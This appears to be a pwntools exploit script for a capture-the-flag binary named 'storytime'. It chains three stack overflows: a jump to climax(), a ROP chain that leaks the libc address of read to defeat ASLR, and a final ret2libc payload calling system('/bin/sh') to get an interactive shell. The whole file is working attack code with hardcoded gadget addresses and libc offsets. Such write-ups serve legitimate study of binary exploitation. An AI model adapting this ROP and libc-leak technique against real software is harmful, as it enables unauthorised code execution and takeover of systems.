from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./storytime")
#libc = ELF("")
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

p = process("./storytime", env=env)
#p = gdb.debug("./storytime", '''
#break main
#break *0x40069c
#''', env=env)

main = 0x40062e
climax = 0x40060e
write_plt = 0x40067b
beg_write_plt = 0x4005cc
read_plt_got = 0x601020
pop_rdi = 0x400703
pop_rsi = 0x400701 # pop_rsi ; popr15 ; ret


##############################################################################
# 1st Overflow - This crash is dead end. Jump to climax() for 2nd overflow.
payload = ''
payload += 'A' * 56
payload += p64(climax)

p.sendline(payload)


##############################################################################
# Climax()  - The 2nd overflow
# Leak Information - Bypass ASLR
payload2 = ''
payload2 += 'A' * 56
payload2 += p64(pop_rdi)
payload2 += p64(0x1)
payload2 += p64(pop_rsi)
payload2 += p64(read_plt_got)
payload2 += p64(0x0)
payload2 += p64(beg_write_plt)
payload2 += 'B' * 8
payload2 += p64(main) # ret to main() for final exploit

p.recv()
p.sendline(payload2)

# libc() read leak
leak = int(p.recv(6)[::-1].encode('hex'),16)
print "libc_read leak: ", hex(leak)

# __libc_start_main() leak
libc_main = leak - 879376
print "libc_start_main leak: ", hex(libc_main)

# __libc_system() leak
libc_system = libc_main + 150608
print "libc_system leak: ", hex(libc_system)

# libc string: '/bin/sh'
binsh = libc_main + 1492503


##############################################################################
# 3rd Overflow - The Exploit
# ROP + ['/bin/sh' in libc] + libc_system
payload3 = ''
payload3 += 'A' * 56
payload3 += p64(pop_rdi)
payload3 += p64(binsh)
payload3 += p64(libc_system)

p.recv()
p.sendline(payload3)
p.interactive()
